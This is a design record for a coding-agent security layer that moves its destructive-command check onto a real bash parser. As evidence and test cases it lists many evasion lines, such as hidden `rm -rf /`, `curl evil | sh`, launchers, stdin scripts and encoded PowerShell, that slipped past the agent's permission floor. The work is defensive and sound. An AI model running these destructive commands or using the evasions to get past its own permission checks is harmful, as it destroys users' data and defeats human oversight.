# Delta — the destructive floor reads a command line as the shell does

| Field | Value |
|---|---|
| **Status** | `RATIFIED 2026-10-24 by the Tech Lead ("ratifico los deltas")`; folded into constitution 1.4 (Art. 3 amendment), PRD 1.23, PRD F2 0.10, API 1.53 and Tech 1.69, and archived |
| **Date** | 2026-10-24 |
| **Task** | T-HRD-06 |
| **REQ** | REQ-SEC-005, REQ-ACP-003 (no change to their text) |
| **Raised by** | Q1 and Q8 of delta `2026-10-hrd02-open-questions`, ratified by the Tech Lead on 2026-10-24 |

## Evidence

`simpleCommands` (`internal/security/domain/policy_destructive.go`) split a line with a regular
expression at `;`, `&&`, `||`, `|`, `&`, newlines, backticks, parentheses and braces, and then
stripped every quote and backslash. Measured against the old normaliser, every line below passed
an allow-everything rule unasked:

- `env 'A=x y' rm -rf /`: the quoted space split the word, so the program became `y` (Q8).
- `rm 'x;y' -rf /`: the quoted `;` split the command.
- `env -S 'umb skill install x'`: `-S` took `umb` as its value, so the program became `skill` (Q1).
- `umb skill $(echo install) x`: the parenthesis split the word, leaving `umb skill $` (Q1).
- `setsid -f umb skill install x`, `systemd-run --user rm -rf /`, `ssh localhost rm -rf /`: the
  launcher was the program.
- `echo 'umb skill install x' | sh`, `echo 'rm -rf /' | at now`: the command is read from stdin.
- `r{m,x} -rf /`, `/bin/r? -rf /`, `$CMD -rf /`, `printf -- '-rf\n/\n' | xargs rm`: the shell
  builds the words at run time.

Both paths into the normaliser were affected: the line `run_command` is asked to run, and an ACP
`execute` permission's `raw_input.command`, which the runtime decides as `run_command`
(`internal/agents/external.go`, `permissionActions`).

## Decisions

1. **A real shell parser.** `MatchDestructive` parses the line with
   `mvdan.cc/sh/v3/syntax` (v3.14.1, BSD-3-Clause) in its bash variant. It walks every
   simple command in the tree: pipelines, lists, subshells, functions, loops, `$(…)` and
   backquotes. A word the line spells statically is read after quote removal, as the shell reads
   it. The patterns themselves are unchanged and still match the normalised text: words joined
   by single spaces, the program as its base name, and output redirections appended as
   `> target`.

2. **`security/domain` may import the parser: an amendment to Art. 3.** The constitution says
   "`domain` imports nothing outside the standard library", and a Tech Design change cannot
   override an article. This delta therefore proposes an Art. 3 amendment, with its row in the
   Amendments table and a Stack row for `mvdan.cc/sh/v3/syntax`, which the Tech Lead ratifies
   with it (constitution 1.4). It is the one exception to Tech §5.2's "domain: stdlib only".
   The `syntax` package does no I/O and imports nothing outside its own module. `.go-arch-lint.yml` names it as a vendor that `security-domain` alone may use, and
   `task arch` rejects the import once that permission is removed (measured). The alternative was
   to move the matcher behind a port. That would have moved `Decide`'s floor out of the pure
   engine that `policy.explain` and every caller share.

3. **What the line does not show asks.** With no pattern matching, a line asks as destructive,
   and the trace step names why:
   - `dynamic_word` — a word built at run time:
     - a parameter;
     - a command, process or arithmetic substitution;
     - `$'…'` or `$"…"`;
     - a brace expansion that expands (a sequence, or two elements or more — find's `{}` stays
       a word);
     - an unquoted glob (`*`, `?`, or a `[` closed later).

     Also arguments read from stdin (`xargs`, `parallel`), or split from a string
     (`env -S`, `--split-string`).
   - `stdin_script` — a shell, `at`, `batch` or `ssh` reading its commands from stdin, when no
     here-document or here-string gives them.
   - `unparseable` — a line bash cannot parse, or scripts nested more than three deep.

   Also counted as `dynamic_word`:
   - arithmetic (`(( ))`, `let`, `$(( ))`, a C-style `for`, and `[[ -eq ]]` and its kin), which
     evaluates a variable's value as an expression, so `x='a[$(cmd)]'; (( x ))` runs `cmd`;
   - an argument holding `$(` or a backquote passed to a builtin that evaluates subscripts
     (`unset`, `declare`, `read`, `printf`, `test` …);
   - the interactive shell's history: an unescaped `!` followed by a word, a leading `^old^new`,
     `fc` and `r`;
   - zsh's `=cmd`, and `hash -p`, which renames a program;
   - `tmux` and `screen` other than listing or attaching, since they run commands or type keys
     in a terminal the line does not show.

   The reserved names may not name a pattern in a rule file, so the trace stays unambiguous.

   This is the literal reading of Q1 (b): "treat any word the parser cannot resolve statically
   as destructive". Globs go beyond the examples Q1 (b) names (`curl https://x/?a=b` asks too). It costs `AllowAlways` for lines with variables or globs, such as
   `ls *.go`, `cd "$HOME"` or `go test $(go list ./...)`. An allow rule no longer carries them,
   and under full-auto they ask. A narrower test was looked for. One pattern, `sql_drop`, matches
   anywhere in the line, so a word of unknown value could always complete it. Any sound narrowing
   would therefore have to change the pattern language, which the rule bundles share. The Tech
   Lead may narrow the reading later. The cost falls on convenience, not on safety.

   It changes approved text. REQ-ORC-004 allows `Exec` in the worktree unasked except for
   REQ-SEC-005's list, and `ls *.go` is not on that list. So this delta amends REQ-SEC-005 to say
   that a command line the system cannot read statically counts as matching the list, and
   REQ-ORC-004 and API §5.22 to say so too. The narrower reading — a dynamic word asking only
   in program or subcommand position, plus `eval` and `env -S` — would leave `rm -$FLAGS /` and
   `git push $F` unasked. **The Tech Lead ratified the delta as written, so the broad reading
   stands** (2026-10-24).

4. **Launchers and script carriers.**
   - `setsid` and `systemd-run` (with its flags that take a value) are wrappers.
   - `ssh` skips its flags and its host, then reads the rest as a script. With no command, it
     reads stdin.
   - `eval` and `watch` read their words as a script.
   - `alias name='…'` reads its value as a script, because the thread's shell is interactive and
     expands aliases.
   - `at` and `batch` read stdin unless given `-f`, `-l`, `-r`, `-d` or `-c`.
   - A shell given a script file (`sh ./build.sh`) runs what the line does not show. Any program
     does that, so the file is not read.
   - A shell's own options are read:
     - `--rcfile` and `--init-file` take a value;
     - an unknown long option may take one, so the line asks as `unparseable`;
     - `-s`, or an operand naming stdin (`/dev/stdin`, `/dev/fd/*`, `/proc/self/fd/*`), reads
       stdin, as does `source` or `.` of such a path.
   - `pkexec`, `taskset`, `unshare`, `nsenter`, `strace`, `ltrace`, and zsh's `noglob` and
     `nocorrect`, are wrappers. `ash`, `mksh`, `yash`, `posh`, `oksh`, `rbash`, `csh` and `tcsh`
     are shells.
   - OpenSSH reads options after the host too, so they are skipped there as well.
   - `sudo -s`/`-i` and `doas -s` with no command start a shell that reads stdin.
   - `env -S` is found inside a flag cluster (`-iS`).
   - `crontab -`, or `crontab` with no file, reads a schedule from stdin.
   - A shell's stdin redirected from `<(…)` is a dynamic word, and from `/dev/stdin` a stdin
     script.
   - A prompt variable (`PS0` … `PS4`, `PROMPT_COMMAND`, zsh's `PROMPT`, `RPROMPT`) holds a script
     the shell runs at every prompt, as do `complete -C` and `bind -x`. Each is read as a script.
   - Output redirections count on every statement, not only on a simple command:
     `{ …; } > /dev/sda`, a subshell, a loop, `exec > /dev/sda`, a bare `> /dev/sda`, and
     `>& file`.
   - ssh's `-o ProxyCommand`, `LocalCommand`, `KnownHostsCommand` and `RemoteCommand`, attached
     (`-oKey=value`) or not, are scripts, before or after the host. The keyword ends at the first
     whitespace or `=`, as OpenSSH splits it; a keyword that is not alphabetic, `-o Match` or
     `Include`, and `-F` with a config file other than `/dev/null`, are dynamic words, since a
     config can hold a ProxyCommand.
   - strace's or ltrace's `-o '|cmd'`, `-o '!cmd'` or `--output=…` pipes its output to a
     command, read as a script.
   - A cluster of short flags (`-vo`, `-fo`) is read letter by letter: the first letter that takes
     a value takes the rest of the word or the next one. A letter the table does not know is also
     read as taking the rest of the word, or the next word when it is the last letter.
   - An interpreter given no inline program, no module and no script file, or `-` or a stdin
     path, reads its program from stdin. That program comes from a here-document or here-string,
     read with the separator split, or else asks as `stdin_script`.
   - PowerShell's parameters are read after `-`, `--`, `/` or an en dash, em dash or horizontal
     bar, in any abbreviation. `-EncodedCommand` and `-EncodedArguments` are dynamic words;
     `-Command -` and `-File -` read the program from stdin wherever they stand on the line.
   - `trap`'s first operand, and the `-c`/`--command` value of `su`, `runuser`, `script` and
     `flock`, are scripts. Without one, `su`, `runuser` and `script` read stdin, and `flock` runs
     the command after its lock file.
   - Every wrapper lists its flags that take a value and the ones that take none. A flag in
     neither list is read both ways, so a flag the table lacks cannot hide the command; the
     readings are bounded by the same depth.
   - Interpreters (`python*`, `perl`, `ruby`, `node`, `bun`, `deno`, `php`, `lua`, the awks,
     `Rscript`, `tclsh`, `osascript`, `pwsh`) run programs that are not shell. Their arguments
     are read with the old separator split, so the parser loses nothing the old normaliser
     caught, such as `os.system('rm -rf /')`.

   An automated security review of the first draft found the option, wrapper-table and
   interpreter gaps, and a second review of the pushed branch the ssh, strace and interpreter-stdin
   ones, a third the ssh keyword splitting, flag clusters, `--output` and PowerShell's
   parameter forms, and a fourth an unknown letter inside a cluster, a PowerShell value read as a
   script file and its Unicode dashes. Spec-guardian found the remaining items above: the redirections the first
   draft lost (five of which `develop` caught), input redirections, ssh, `sudo -s`, history,
   zsh, prompt variables, arithmetic and the launchers. Each case is in the evasion table, red
   against the draft before it.

   **What still escapes:** a program that runs a command it is given and is in none of these
   lists, and a renamed binary. The floor is not a sandbox. For the commands that matter most,
   the daemon's peer check, not a pattern, refuses an agent's terminal the `userOnly` methods
   (T-HRD-05). Lines are parsed as bash even in a zsh thread; zsh's own syntax that bash cannot
   parse asks as `unparseable`.

5. **The rules' split is unchanged.** `CommandParts`, which allow and deny rules match against,
   still splits at the separators. A quoted separator therefore splits a line into more parts
   for a rule than the shell sees. A deny then matches more and an allow must cover more, which
   is the conservative direction. Moving rules onto the parser changes what a user's existing
   rule matches, so it is left for a delta of its own.

6. **Three existing cases change.**
   - `" ; "` was "no command, so no rule allows it". It is now `unparseable`, which still asks,
     now at the destructive step.
   - The allow-rule case `git status; curl evil | sh` now asks at the destructive step, as
     `stdin_script`. Its test line becomes `… | grep x` to keep testing what it tested.
   - `TestATerminalThatRunsAScriptAsks_REQ_ACP_005`'s terminal, `sh -c "env 'A=x y' rm -rf /"`,
     now asks at the destructive step, because the parser reads the script. Its script becomes
     `make build`, which still asks, as a script terminal does.

## Spec changes

- Constitution 1.4 (proposed): Art. 3's domain bullet names the exception; a Stack row and an
  Amendments row, "pending" until the Tech Lead ratifies.
- PRD 1.23: REQ-SEC-005 counts a command line the system cannot read statically as matching.
- PRD F2 0.10: REQ-ORC-004's destructive list includes such a line.
- API 1.53, no wire change: §5.22's full-auto still asks for it; §5.36's destructive `detail` may
  be `dynamic_word`, `stdin_script` or `unparseable`, names a rule file may not use.
- Tech 1.69:
  - §5.2: `security/domain` may also import `mvdan.cc/sh/v3/syntax`.
  - §5.3: the normalisation bullet rewritten: the parser, the launchers, the script carriers,
    and the three reasons to ask.
  - §5.3f: the `_` view of an ACP terminal's words is described as a second view, kept from
    before the parser.
  - §5.3's "an agent's terminal cannot land its own work": a line built by expansion now asks;
    what escapes is a renamed binary or an unknown launcher.
  - The Constitution check names the Art. 3 amendment.
- `.go-arch-lint.yml`: the `shell-syntax` vendor, which only `security-domain` may use.
- `ParseRules` refuses a destructive pattern named `dynamic_word`, `stdin_script` or
  `unparseable`.

## Verification

- `TestDestructiveEvasionsAsk_REQ_SEC_005`:
  - 130 evasions ask as destructive and never `always`, in `normal`, `auto-edit` and `full-auto`;
  - 19 lines that hold patterns or separators only as quoted data stay allowed;
  - the trace names `rm_recursive`, `dynamic_word`, `stdin_script` or `unparseable`.
- `TestARunCommandEvasionAsks_REQ_SEC_005`: six of the evasions, asked of the runtime as
  commands, each ask as destructive.
- `TestAnACPExecuteEvasionAsks_REQ_ACP_003`: the same six, as an ACP `execute` permission
  under full-auto in the worktree, each ask as destructive and are refused when the user
  refuses.
- Red first: the three tests fail against the old normaliser.
- Mutations, each turning the evasion test red: no dynamic-word flag, no `setsid` wrapper, no
  stdin flag, no glob check, no brace check, single quotes misread, no `unparseable` flag, no
  `alias`, no `xargs` flag.
- `TestParseRulesRefusesWhatItCannotTrust_REQ_SEC_010`: the three reserved names are refused,
  red first.
- `TestDestructiveAlwaysAsk_REQ_SEC_005`'s 74 destructive and 32 harmless lines pass unchanged.
